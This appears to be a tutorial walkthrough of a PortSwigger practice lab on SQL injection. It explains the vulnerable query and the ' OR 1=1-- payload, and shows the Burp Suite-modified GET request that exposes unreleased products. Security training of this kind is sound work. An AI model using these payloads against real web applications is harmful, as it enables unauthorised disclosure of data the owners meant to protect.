# Walkthrough: Retrieving Hidden Data with SQL Injection

This lab from PortSwigger is a classic introduction to SQL injection. The objective is simple: manipulate a database query to reveal information that is meant to be hidden from the user. Specifically, we need to make the application show all products in the ‘Pets’ category, including those that are marked as “unreleased”.

## Understanding the Flaw

The application presents a product listing page with a filter for categories. When you select a category, like “Pets”, the website sends a request to the server, likely including the category name in a parameter. On the backend, the server takes this input and builds an SQL query to fetch the relevant products from its database.

The query probably looks something like this:

```sql
SELECT * FROM products WHERE category = 'Pets' AND released = 1
```

This query is designed to be secure. It fetches products where the category is ‘Pets’ and where the released flag is set to `1`. The products with `released = 0` are the hidden data we are after. 

The vulnerability arises because the application likely takes our input (`Pets`) and places it directly into the query string without any cleaning or sanitization. This oversight allows us to break out of the intended query structure and inject our own commands.

## Crafting the Payload

To bypass the `released = 1` restriction, we need to alter the logic of the `WHERE` clause. We can do this with a simple but effective payload:

```text
' OR 1=1--
```

Let’s break down how this works:
1.  **The Single Quote (`'`)**: Closes the opening quote for the category name in the original query. This effectively ends the `category = 'Pets'` part of the statement.
2.  **OR 1=1**: This is a condition that is always true. By injecting it, we change the `WHERE` clause to `...WHERE category = 'Pets' OR 1=1...`. Since `1=1` is always true, the database will ignore the category check and return every row.
3.  **The Comment (`--`)**: Tells the database to ignore everything that follows on that line, which conveniently nullifies the original `AND released = 1` part of the query.

After our injection, the server executes a query that effectively looks like this:

```sql
SELECT * FROM products WHERE category = 'Pets' OR 1=1--
```

This new query returns all products, successfully exposing the hidden data.

## Executing the Attack with Burp Suite

To perform this attack, we’ll use Burp Suite to intercept and modify the request sent to the server.

### Step 1: Intercept the Request
First, navigate to the lab and turn on Burp’s “Intercept” feature. Then, filter the products by any category, for example, “Pets”. Burp will capture the outgoing HTTP request. It will look similar to this:

```http
GET /filter?categoryId=Pets HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```

### Step 2: Modify the Request
Now, we modify the request. In the first line, append our payload to the `categoryId` parameter. Remember that spaces in a URL are encoded as `+`.

The modified line should be:

```http
GET /filter?categoryId=Pets'+OR+1=1-- HTTP/1.1
```

The complete, modified request to forward will be:

```http
GET /filter?categoryId=Pets'+OR+1=1-- HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```

### Step 3: Forward and Verify
After forwarding this request, the browser will display the response from the server. You will now see a list of all products, including the previously hidden ones from the ‘Pets’ category. The lab will then be marked as complete.

## Conclusion

This lab perfectly demonstrates the core danger of SQL injection: unauthorized data disclosure. By trusting user input without proper validation, the application allowed us to completely bypass its business logic and access data it was designed to hide. This fundamental flaw can have severe consequences in real-world applications, leading to the exposure of sensitive user information, financial records, and proprietary corporate data.